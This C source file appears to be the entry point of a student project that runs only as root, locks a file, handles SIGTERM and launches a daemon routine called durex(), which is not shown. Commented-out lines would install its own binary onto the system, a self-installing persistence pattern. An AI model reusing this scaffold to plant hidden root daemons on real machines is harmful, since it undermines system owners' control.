/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2018/07/20 17:57:28 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getrlimit */
#include <sys/time.h>
#include <sys/resource.h>
/* memset strlen */
#include <string.h>
/* signal */
#include <signal.h>
/* remove */
#include <stdio.h>
/* exit */
#include <stdlib.h>

#include "main.h"

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	remove(DUREX_LOCK_FILE);
	close(e.lock);
	exit(0);
}

int					main()
{
	/* int				fd; */

	if (getuid() != 0)
		return 3;
	/* if ((fd = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) { */
	/* 	install_binary(fd); */
	/* 	close(fd); */
	/* 	write(STDIN_FILENO, "gbourgeo\n", 9); */
	/* 	return 0; */
	/* } */
	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_EXCL | O_RDWR, 0600);
	if (e.lock < 0)
		return 3;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
		return 3;
	signal(SIGTERM, &durexSigterm);
	durex();
	quitClearlyDaemon();
	return 0;
}
